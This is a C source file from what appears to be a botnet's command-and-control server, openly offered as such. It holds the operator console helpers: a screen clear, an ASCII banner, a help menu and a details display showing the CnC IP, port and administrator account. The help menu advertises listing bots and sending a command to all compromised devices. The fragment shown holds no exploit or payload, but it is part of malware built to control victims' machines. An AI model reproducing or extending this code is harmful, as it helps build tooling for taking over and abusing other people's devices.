#include "../../includes/io/io.h"
#pragma once


/*
    *    util/io/io.c
    *    Date: 11/09/21
    *    Author: 0x1CA3
*/


static void clear_screen(int fd_user) {
    char *clear = "\033[H\033[2J";
    send(fd_user, clear, strlen(clear), 0);
}

static void display_banner(int fd_user) {
    char *banner[13];    
    
    banner[0] = "\n                                  s    \n";
    banner[1] = "                                 :8    \n";
    banner[2] = "       u.    u.                 .88    \n";
    banner[3] = "     x@88k u@88c.      .u      :888ooo \n";
    banner[4] = "    ^'8888''8888'   ud8888.  -*8888888 \n";
    banner[5] = "      8888  888R  :888'8888.   8888    \n";
    banner[6] = "      8888  888R  d888 '888'   8888    \n";
    banner[7] = "      8888  888R  8888.+'      8888    \n";
    banner[8] = "      8888  888R  8888L       .8888Lu= \n";
    banner[9] = "    '*88*' 8888' '8888c. .+  ^8888*   \n";
    banner[10] = "       ''   'Y'    '888888      'Y'    \n";
    banner[11] = "                     'YP'              \n";
    banner[12] = "    [Made By: https://github.com/0x1CA3]\n\n";

    for (int i = 0; i < 13; i++) {
        send(fd_user, banner[i], strlen(banner[i]), 0);
    }
}

static void help_menu(int fd_user) {
    char *help_menu[9];
    
    help_menu[0] = "\n          Commands          Description\n";
    help_menu[1] = "          --------          -----------\n";
    help_menu[2] = "          ?/help            Displays available commands.\n";
    help_menu[3] = "          bots/list         Shows the bot count.\n";
    help_menu[4] = "          command           Lets you send a command to all the devices.\n";
    help_menu[5] = "          server            Shows details about the CnC server.\n";
    help_menu[6] = "          banner            Displays the ASCII banner.\n";
    help_menu[7] = "          clear/cls         Clears the screen.\n";
    help_menu[8] = "          exit/quit         Exits the botnet.\n";

    for (int i = 0; i < 9; i++) {
        send(fd_user, help_menu[i], strlen(help_menu[i]), 0);
    }
}

static void cnc_details(int fd_user) {
    char cnc_details_line_1[1024];
    char cnc_details_line_2[1024];
    char cnc_details_line_3[1024];
    char cnc_details_line_4[1024];
    char cnc_details_line_5[1024];
    char cnc_details_line_6[1024];

    sprintf(cnc_details_line_1, "\n         CnC Details");
    sprintf(cnc_details_line_2, "\n         -----------");
    sprintf(cnc_details_line_3, "\n         IP: %s", CNC_IP);
    sprintf(cnc_details_line_4, "\n         Port: %d", CNC_PORT);
    sprintf(cnc_details_line_5, "\n         Account Name: %s", USERNAME);
    sprintf(cnc_details_line_6, "\n         Account Type: Administrator\n");

    send(fd_user, cnc_details_line_1, strlen(cnc_details_line_1), 0);
    send(fd_user, cnc_details_line_2, strlen(cnc_details_line_2), 0);
    send(fd_user, cnc_details_line_3, strlen(cnc_details_line_3), 0);
    send(fd_user, cnc_details_line_4, strlen(cnc_details_line_4), 0);
    send(fd_user, cnc_details_line_5, strlen(cnc_details_line_5), 0);
    send(fd_user, cnc_details_line_6, strlen(cnc_details_line_6), 0);
}